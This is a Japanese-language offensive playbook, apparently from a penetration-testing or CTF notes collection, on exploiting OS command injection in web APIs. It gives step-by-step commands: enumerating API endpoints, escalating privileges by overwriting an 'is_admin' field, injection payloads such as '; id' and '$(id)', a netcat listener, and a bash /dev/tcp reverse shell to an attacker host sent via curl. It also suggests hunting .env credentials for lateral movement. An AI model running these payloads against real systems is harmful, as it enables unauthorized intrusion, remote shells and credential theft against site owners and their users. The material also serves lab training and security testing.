## OSコマンドインジェクション

### 着火条件
- Webアプリ・APIが外部入力をOSコマンドの一部として組み込んでいる
- VPN設定生成・ping・traceroute・ファイル変換など、OSコマンドを内部で実行することが想定される機能がある
- APIが `username`, `host`, `ip`, `domain`, `target` 等のパラメータを受け取り、処理結果（ファイル内容・コマンド出力）を返す

### 観点・着眼点

**コマンドインジェクションを疑うシグナル：**

| APIの特徴 | 次のアクション |
|----------|--------------|
| `username`, `host`, `ip` 等の識別子パラメータを受け取る | セミコロン + `id` で注入テスト |
| レスポンスが「設定ファイル内容」「コマンド出力っぽいテキスト」を返す | 入力がそのままコマンドに渡されている可能性が高い |
| パラメータを空にすると「Missing parameter」エラーが返る | サーバー側でのコマンド組み立てを示唆 |
| `; sleep 5` を送ると応答が5秒遅延する | タイムベースで確認できる |

**管理者専用APIにコマンドインジェクションがある場合が多い：**
一般ユーザーがアクセスできるAPIにはインジェクションがなく、管理者APIにある、というパターンが典型。まずAPI権限を昇格させてから試みる。

---

### 手順

#### Step 0: API一覧の取得

認証後のセッションで `/api/v1` 等のルートエンドポイントを叩くと、全エンドポイント一覧が返ることがある。

```bash
curl http://[TARGET]/api/v1 -H "Cookie: PHPSESSID=<セッション>"
# → admin用エンドポイント（PUT/POST等）が一覧で得られる
```

**標準的なワードリストでAPIエンドポイントのファジングが失敗する場合、** `/api/v1` 直叩きで一覧が取れることがある。

---

#### Step 1: APIパラメータ改ざんによる権限昇格（必要な場合）

認証後のAPIが `is_admin`, `role`, `privilege` 等のフィールドをクライアント側からの更新リクエストで受け付ける設計になっている場合、そのフィールドを改ざんすることで権限昇格できる（Broken Function Level Authorization）。

```bash
# 管理者設定更新APIへの改ざんリクエスト例
curl -X PUT http://[TARGET]/api/v1/admin/settings/update \
  -H "Cookie: PHPSESSID=<セッション>" \
  -H "Content-Type: application/json" \
  -d '{"email": "user@example.com", "is_admin": 1}'
# レスポンスに "is_admin":1 が返れば管理者権限取得

# 確認
curl http://[TARGET]/api/v1/admin/auth -H "Cookie: PHPSESSID=<セッション>"
```

**着眼点：** APIレスポンスに `is_admin`, `role`, `admin` 等のフィールドが含まれる場合、それをPUT/PATCHで上書きできないか試す。HTTP メソッドを変えながらエラーメッセージの変化を見ると設計が見えてくる。

---

#### Step 2: コマンドインジェクションテスト

```bash
# 基本確認（セミコロン区切り）
{"username": "test; id"}
{"username": "test; whoami"}

# タイムベース確認（応答が遅延すればコマンドが実行されている）
{"username": "test; sleep 5"}

# その他のシェルメタ文字
{"username": "test && id"}
{"username": "test | id"}
{"username": "test$(id)"}
{"username": "`id`"}
```

レスポンスに `uid=` が含まれればコマンドインジェクション確定。

---

#### Step 3: リバースシェル取得

**攻撃側（Kali）でリスナーを起動：**
```bash
nc -lvnp 4444
```

**ペイロード：**
```bash
bash -c 'bash -i >& /dev/tcp/[ATTACKER_IP]/4444 0>&1'
```

**curlで送信する場合のシングルクォートエスケープ：**
```bash
curl -X POST http://[TARGET]/api/v1/admin/vpn/generate \
  -H "Cookie: PHPSESSID=<セッション>" \
  -H "Content-Type: application/json" \
  -d '{"username": "test; bash -c '"'"'bash -i >& /dev/tcp/<attacker ip>/4444 0>&1'"'"'"}'
```

`'"'"'` の分解：
- `'` → curlシングルクォートを閉じる
- `"'"` → ダブルクォートでシングルクォート1文字を渡す
- `'` → curlシングルクォートを再度開く

---

#### Step 4: シェル安定化

リバースシェル取得直後にTTYが割り当てられていないため、`sudo` / `su` 等が使えない。

> シェル安定化の詳細手順 → `../../03_Post_Access_Linux/Shell_Stabilization.md`

### 注意点・落とし穴
- コマンドインジェクションのテストは**まず `id` で確認してからリバースシェルへ移行**する。確認なしにシェル取得を試みると成否が判断できない
- www-dataや低権限ユーザーでシェルが取れた場合、`.env` / 設定ファイル等の認証情報を探して横展開・権限昇格を目指す
- API管理者昇格はすべてのAPIで成立するわけではない。`is_admin` フィールドの存在と書き込み可能であることが前提
- POSTボディの Content-Type が `application/json` でなく `application/x-www-form-urlencoded` の場合はパラメータ形式が `key=value&...` になる
- 標準的なワードリストでAPIエンドポイントのファジングが失敗することがある（API専用パスが一般的なディレクトリ名と異なるため）。`/api/v1` 直叩きで一覧取得を先に試みる

### 関連技術
- 難読化JSからAPIエンドポイント発見 → `JS_Obfuscation.md`
- シェル安定化 → `../../03_Post_Access_Linux/Shell_Stabilization.md`
- 侵入後の .env ファイル探索 → `../../02_Initial_Access/Credential_Discovery.md`
- API列挙・ディレクトリ探索 → `../../01_Reconnaissance/Web_Enumeration.md`
